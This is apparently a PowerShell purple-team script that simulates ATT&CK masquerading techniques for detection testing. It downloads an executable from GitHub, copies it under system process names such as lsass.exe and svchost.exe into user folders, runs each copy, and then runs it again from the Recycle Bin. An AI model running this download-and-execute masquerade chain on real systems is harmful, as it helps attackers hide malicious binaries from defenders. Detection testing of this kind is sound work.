<#
    T1036.004 - Masquerading: Masquerade Task or Service
    T1036.003 - Masquerading: Rename System Utilities
    T1036.005 - Masquerading: Match Legitimate Name or Location
    T1074.001 - Data Staged: Local Data Staging
    T1564.001 - Hide Artifacts: Hidden Files and Directories
    Simulated execution of legitimate system utilities with the same name in abnormal locations (recyclebin, temp ...)
    Detection: Any executables from windows\system32 not executing from their original location or their original parent process name
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force -Verbose

$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/pslist.exe"
$dumpfile = "$env:tmp\executed.log"
$outfile = "$env:tmp\svchst.exe"
$listexe = @("svchost.exe","cmd.exe","dwm.exe","lsass.exe","mshta.exe","net.exe","net1.exe","netsh.exe","rundll32.exe","wscript.exe","regsvr32.exe","services.exe","spoolsv.exe","winlogon.exe","dllhost.exe","explorer.exe","ntoskrnl.exe","SearchProtocolHost.exe")
$folders = @("$env:HOMEDRIVE$env:HOMEPATH\Documents","$env:HOMEDRIVE$env:HOMEPATH\Desktop","$env:HOMEDRIVE$env:HOMEPATH\Pictures","$env:HOMEDRIVE$env:HOMEPATH\Music","$env:HOMEDRIVE$env:HOMEPATH\Videos","$env:HOMEDRIVE","$env:HOMEDRIVE\PerfLogs","$env:PUBLIC")
try {
    Write-Host -ForegroundColor Cyan "Downloading $url to $outfile..." 
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $url -OutFile $outfile -Verbose
    if (Test-Path $outfile){
        foreach($exe in $listexe){
            foreach($folder in $folders){
                Write-Host -ForegroundColor Cyan "Copying $outfile to $folder\$exe"
                copy-item $outfile "$folder\$exe" -Force -Verbose -ErrorAction SilentlyContinue
                if (Test-Path "$folder\$exe"){
                    Write-Host -ForegroundColor Green "Success: Copied $outfile to $folder\$exe"
                    Write-Host -ForegroundColor Cyan "Executing $folder\$exe"
                    Start-Process "$folder\$exe" -ArgumentList -t -Wait -NoNewWindow -Verbose -ErrorAction SilentlyContinue > $dumpfile
                    if (Test-Path $dumpfile){
                        write-host -ForegroundColor Green "Success: Executed $folder\$exe"
                        Remove-item $dumpfile -Force -Verbose
                    }
                    else {
                        Write-Host -ForegroundColor Red "Error: Failed to execute $folder\$exe"
                    }
                }
                else{
                    Write-Host -ForegroundColor Red "Error: Failed to copy $outfile to $folder\$exe"
                }
            }
        }
        Write-Host -ForegroundColor Cyan "Executing $outfile ..."
        Start-Process "$folder\$exe" -ArgumentList -t -Wait -NoNewWindow -Verbose

        Write-Host -ForegroundColor Cyan "Moving $outfile to Recyclebin..."
        Add-Type -AssemblyName Microsoft.VisualBasic
        [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteFile($outfile,'OnlyErrorDialogs','SendToRecycleBin')
        $outfilename = $outfile.Split('\')[-1]
        $recyclebin_content = (New-Object -ComObject Shell.Application).NameSpace(0x0A).Items()
        $recyclebin_found = $recyclebin_content | Select-Object Name | Where-Object -Property Name -eq $outfilename
        if ($recyclebin_found){
            Write-Host -ForegroundColor Green "Success: $outfile moved to Recyclebin"
            $recyclebin_found_path = ($recyclebin_content  | Where-Object -Property Name -eq $outfilename).Path
            if ($recyclebin_found_path){
                Write-Host -ForegroundColor Green "Success: $outfilename path in recycle bin is $recyclebin_found_path"
                Write-Host -ForegroundColor Cyan "Executing from recycle bin $recyclebin_found_path ..."
                Start-Process "$recyclebin_found_path" -ArgumentList -t -Wait -NoNewWindow -Verbose >> $dumpfile
                if (Test-Path $dumpfile){
                    write-host -ForegroundColor Green "Success: Executed $outfilename from RecycleBIn $recyclebin_found_path"
                    Remove-item $dumpfile -Force -Verbose
                }
                else {
                    Write-Host -ForegroundColor Red "Error: Failed to execute $outfilename from RecycleBin $recyclebin_found_path"
                }
            }
            else{
                Write-Host -ForegroundColor Red "Error: Failed to get $outfile path from Recyclebin"
            }
        }
        else{
            Write-Host -ForegroundColor Red "Error: Failed to move $outfile to Recyclebin"
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download $url to $outfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "Error: $_"
}

Stop-Transcript
